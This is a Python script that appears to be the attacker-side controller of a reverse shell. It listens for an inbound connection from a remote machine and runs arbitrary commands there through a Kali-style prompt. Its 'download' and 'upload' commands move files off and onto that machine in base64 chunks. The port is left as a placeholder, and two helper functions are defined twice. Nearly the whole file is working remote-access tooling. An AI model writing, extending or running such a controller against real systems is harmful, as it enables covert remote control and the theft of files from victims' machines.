import socket
import json
import shutil
import datetime
import sys
import time
import socket as socklib
import re
import os
import base64
import itertools

HOST = "0.0.0.0"
PORT = ....
MSG_DELIM = "\n"


C_RESET = "\x1b[0m"
C_BOLD = "\x1b[1m"
C_RED = "\x1b[31m"
C_YELLOW = "\x1b[33m"
C_BLUE = "\x1b[34m"
C_GREEN = "\x1b[32m"

_id_counter = itertools.count(1)

def term_width():
    try:
        return shutil.get_terminal_size().columns
    except Exception:
        return 80

def shorten_cwd(cwd, user):
    if not cwd:
        return "~"
    home = f"/home/{user}"
    if cwd.startswith(home):
        cwd = cwd.replace(home, "~", 1)
    if len(cwd) > 30:
        parts = cwd.split("/")
        if len(parts) > 3:
            return "/" + parts[1] + "/.../" + parts[-1]
    return cwd

def build_prompt_lines(state):
    user = state.get('user') or "?"
    host = state.get('host') or socklib.gethostname()
    cwd = state.get('cwd') or "~"
    short = shorten_cwd(cwd, user)
    line1 = (
        f"{C_BOLD}{C_RED}┌──({C_YELLOW}{user}{C_RED}㉿{C_BLUE}{host}{C_RED})-{C_RESET}[{C_GREEN}{short}{C_RESET}{C_BOLD}{C_RED}]{C_RESET}"
    )
    line2 = f"{C_BOLD}{C_RED}└─{C_RESET}$ "
    return line1, line2

_conn_buffers = {}  # keyed by socket.fileno()

def recv_and_parse(conn, timeout=None):

    fileno = conn.fileno()
    if fileno not in _conn_buffers:
        _conn_buffers[fileno] = b""

    buf = _conn_buffers[fileno]
    delim = MSG_DELIM.encode()


    orig_timeout = conn.gettimeout()
    try:
        if timeout is not None:
            conn.settimeout(timeout)
        while True:

            if delim in buf:
                raw, _, rest = buf.partition(delim)
                _conn_buffers[fileno] = rest  
                try:
                    data = json.loads(raw.decode("utf-8", errors="replace"))
                    return data
                except json.JSONDecodeError:
                    

                    buf = rest
                    _conn_buffers[fileno] = buf
                    continue

            
            try:
                chunk = conn.recv(8192)
            except socket.timeout:
                return {}
            except Exception:
                return None

            if not chunk:
                
                _conn_buffers.pop(fileno, None)
                return None

            buf += chunk
            _conn_buffers[fileno] = buf

    finally:
        conn.settimeout(orig_timeout)

def looks_like_name_list(text):
    lines = [ln for ln in text.splitlines() if ln.strip() != ""]
    if len(lines) < 2:
        return False
    if all(len(ln) < 200 for ln in lines):
        return True
    return False

def split_names_from_output(text):
    lines = [ln for ln in text.splitlines() if ln.strip() != ""]
    if all(len(ln.split()) == 1 for ln in lines):
        return lines
    tokens = []
    for ln in lines:
        parts = re.split(r"\s{2,}", ln.strip())
        if len(parts) > 1:
            tokens.extend(parts)
        else:
            quoted = re.findall(r"'[^']*'|\"[^\"]*\"", ln)
            if quoted:
                for q in quoted:
                    tokens.append(q.strip("'\""))
                rest = re.sub(r"'[^']*'|\"[^\"]*\"", "", ln).strip()
                if rest:
                    tokens.extend([t for t in rest.split() if t])
            else:
                tokens.extend([t for t in ln.split() if t])
    tokens = [t for t in (x.strip() for x in tokens) if t]
    return tokens



def looks_like_name_list(text):
   
    if not text or not text.strip():
        return False
    
    lines = [ln for ln in text.splitlines() if ln.strip()]
    if len(lines) < 2:
        return False

    
    dir_re = re.compile(r"^\s*\d{1,2}/\d{1,2}/\d{2,4}\s+\d{1,2}:\d{2}\s*(AM|PM)?\s+(<DIR>|\d[,\d]*)\s+.+$", re.IGNORECASE)
    matches = sum(1 for ln in lines if dir_re.match(ln))
    if matches >= max(1, len(lines) // 4):  # لو جزء معقول من الأسطر تطابق نمط dir
        return True

    
    ext_like = sum(1 for ln in lines if re.search(r"[^\s]+\.[A-Za-z0-9]{1,6}($|\s)", ln) or re.search(r"'[^']+'|\"[^\"]+\"", ln))
    if ext_like >= max(1, len(lines) // 3):
        return True

    return False



def split_names_from_output(text):

    if not text:
        return []

    lines = [ln.rstrip("\r") for ln in text.splitlines() if ln.strip()]
    names = []

    
    dir_re = re.compile(
        r"^\s*(?P<date>\d{1,2}/\d{1,2}/\d{2,4})\s+"
        r"(?P<time>\d{1,2}:\d{2})(?:\s*(?P<ampm>AM|PM))?\s+"
        r"(?P<type><DIR>|\d[\d,]*)\s+(?P<name>.+)$",
        re.IGNORECASE
    )

    for ln in lines:
        m = dir_re.match(ln)
        if m:
            name = m.group("name").strip()

            if (name.startswith("'") and name.endswith("'")) or (name.startswith('"') and name.endswith('"')):
                name = name[1:-1]
            names.append(name)
            continue


        quoted = re.findall(r"'([^']+)'|\"([^\"]+)\"", ln)
        if quoted:
            for q in quoted:
                
                name = q[0] or q[1]
                names.append(name)
            continue

        
        ext_match = re.search(r"([^\s/\\]+?\.[A-Za-z0-9]{1,6})(?:\s|$)", ln)
        if ext_match:
            names.append(ext_match.group(1))
            continue

        
        dir_token_match = re.search(r"<DIR>\s+(.+)$", ln, re.IGNORECASE)
        if dir_token_match:
            names.append(dir_token_match.group(1).strip())
            continue

        
        parts = re.split(r"\s{2,}", ln.strip())
        if len(parts) > 1:
            candidate = parts[-1].strip()
            names.append(candidate)
            continue

        
        words = ln.strip().split()
        if words:
            names.append(words[-1])

    
    cleaned = [n for n in (x.strip() for x in names) if n]
    return cleaned

def quote_if_spaces(name):
    if " " in name:
        if (name.startswith("'") and name.endswith("'")) or (name.startswith('"') and name.endswith('"')):
            return name
        return f"'{name}'"
    return name

def print_in_columns(names):
    if not names:
        return
    width = term_width()
    col_w = max(len(n) for n in names) + 2
    cols = max(1, min(4, width // max(20, col_w)))
    rows = (len(names) + cols - 1) // cols
    matrix = []
    for r in range(rows):
        row = []
        for c in range(cols):
            idx = c * rows + r
            row.append(quote_if_spaces(names[idx]) if idx < len(names) else "")
        matrix.append(row)
    col_widths = [max((len(matrix[r][c]) for r in range(rows)), default=0) + 2 for c in range(cols)]
    for r in range(rows):
        line = ""
        for c in range(cols):
            cell = matrix[r][c]
            if cell:
                line += cell.ljust(col_widths[c])
        print(line.rstrip())


def send_get_command(conn, remote_path):
    cid = next(_id_counter)
    payload = json.dumps({"action":"get","path": remote_path, "id": cid}) + MSG_DELIM
    conn.sendall(payload.encode())
    return cid

def handle_incoming_file_stream(conn, expected_id, save_dir="."):
    """
    Robustly handle streamed file messages for the given expected_id.
    Uses recv_and_parse which preserves extra messages in buffer.
    """
    filename = None
    out_f = None
    try:
        while True:
            msg = recv_and_parse(conn, timeout=5)
            if msg is None:
                return False, "connection closed or error"
            if msg == {}:
                
                continue

            sid = msg.get("id")
            if sid != expected_id:
                
                continue

            st = msg.get("status")
            if st == "file_start":
                filename = msg.get("name")
                size = msg.get("size", 0)
                target = os.path.join(save_dir, filename)
                try:
                    out_f = open(target, "wb")
                except Exception as e:
                    return False, f"open error: {e}"
            elif st == "file_chunk":
                data = msg.get("data")
                if out_f is None:
                    return False, "received chunk but no open file"
                try:
                    out_f.write(base64.b64decode(data))
                except Exception as e:
                    if out_f: out_f.close()
                    return False, f"write error: {e}"
            elif st == "file_end":
                if out_f:
                    out_f.close()
                    return True, filename
                else:
                    return False, "no file open on end"
            elif st == "error":
                return False, msg.get("msg")
            else:
                
                continue
    finally:
        if out_f and not out_f.closed:
            out_f.close()

def send_put_stream(conn, local_path, remote_dest):
    cid = next(_id_counter)
    payload = json.dumps({"action":"put","path": remote_dest, "size": os.path.getsize(local_path), "id": cid}) + MSG_DELIM
    conn.sendall(payload.encode())
    with open(local_path, "rb") as f:
        while True:
            chunk = f.read(65536)
            if not chunk:
                break
            b64 = base64.b64encode(chunk).decode('ascii')
            chunk_msg = json.dumps({"action":"put_chunk","data": b64, "id": cid}) + MSG_DELIM
            conn.sendall(chunk_msg.encode())
    conn.sendall((json.dumps({"action":"put_end","id": cid}) + MSG_DELIM).encode())
    
    resp = recv_and_parse(conn)
    return resp, cid


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[+] Listening on {HOST}:{PORT} ...")

    conn, addr = s.accept()
    print(f"[+] Connected from {addr[0]}:{addr[1]}")

    state = {'cwd': None, 'user': None, 'host': socklib.gethostname()}

    conn.settimeout(0.3)
    try:
        initial = recv_and_parse(conn)
        if initial and initial.get("status") == "connected":
            state['cwd'] = initial.get("cwd", state['cwd'])
            state['user'] = initial.get("user", state['user'])
    except Exception:
        pass
    finally:
        conn.settimeout(None)

    print("\nTip: run 'whoami' once to sync user prompt.\n")

    try:
        while True:
            line1, line2 = build_prompt_lines(state)
            print(line1)
            try:
                cmd = input(line2)
            except EOFError:
                break

            cmd = cmd.strip()
            if not cmd:
                continue

            if cmd.lower() in ("exit", "quit"):
                print("[*] Closing connection...")
                break

            
            if cmd.lower().startswith("download "):
                remote_path = cmd[len("download "):].strip()
                cid = send_get_command(conn, remote_path)
                ok, info = handle_incoming_file_stream(conn, cid, save_dir=".")
                if ok:
                    print(f"[+] Saved file: {info}")
                else:
                    print(f"{C_RED}[!] Download failed: {info}{C_RESET}")
                continue

            
            if cmd.lower().startswith("upload "):
                parts = cmd.split(None, 2)
                if len(parts) < 3:
                    print(f"{C_RED}[!] usage: upload <local_path> <remote_dest_path>{C_RESET}")
                    continue
                local_path = parts[1]
                remote_dest = parts[2]
                if not os.path.exists(local_path):
                    print(f"{C_RED}[!] local file not found{C_RESET}")
                    continue
                resp, cid = send_put_stream(conn, local_path, remote_dest)
                if resp and resp.get("status") == "ok":
                    print(f"[+] Uploaded to client: {remote_dest}")
                else:
                    print(f"{C_RED}[!] Upload may have failed: {resp}{C_RESET}")
                continue

            
            command_data = {"command": cmd}
            payload = json.dumps(command_data) + MSG_DELIM
            try:
                conn.sendall(payload.encode())
            except Exception:
                print(f"{C_RED}[!] Connection lost while sending command.{C_RESET}")
                break

            resp = None
            while True:
                resp = recv_and_parse(conn)
                if not resp:
                    break
                if resp.get("status") == "heartbeat":
                    continue
                break

            if not resp:
                print(f"{C_RED}[!] No response. Connection closed?{C_RESET}")
                break

            status = resp.get("status")
            out = resp.get("output", "")

            if status == "output":
                if looks_like_name_list(out):
                    names = split_names_from_output(out)
                    if names:
                        print_in_columns(names)
                    else:
                        sys.stdout.write(out)
                else:
                    sys.stdout.write(out)
                if not out.endswith("\n"):
                    print()
                if cmd.strip() == "whoami":
                    user = out.strip().splitlines()[0] if out.strip() else None
                    if user:
                        state['user'] = user

            elif status == "ok":
                if 'cwd' in resp:
                    state['cwd'] = resp['cwd']
                if resp.get("msg"):
                    print(resp["msg"])

            elif status == "error":
                print(f"{C_RED}[!] Remote error:{C_RESET} {resp.get('msg')}")

            elif status == "connected":
                state['cwd'] = resp.get("cwd", state['cwd'])

            elif status == "file":
                print(f"{C_GREEN}[+] Incoming file — size: {resp.get('size', 0)} bytes{C_RESET}")

            else:
                print("[<] Unknown:", resp)

           
            conn.settimeout(0.02)
            for _ in range(10):
                try:
                    stale = recv_and_parse(conn)
                    if not stale:
                        break
                    if stale.get("status") in ("heartbeat", "ok", "output"):
                        continue
                except socket.timeout:
                    break
                except Exception:
                    break
            conn.settimeout(None)

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    finally:
        try:
            conn.close()
        except:
            pass
        s.close()
        print("[*] Controller exiting cleanly.")

if __name__ == "__main__":
    main()
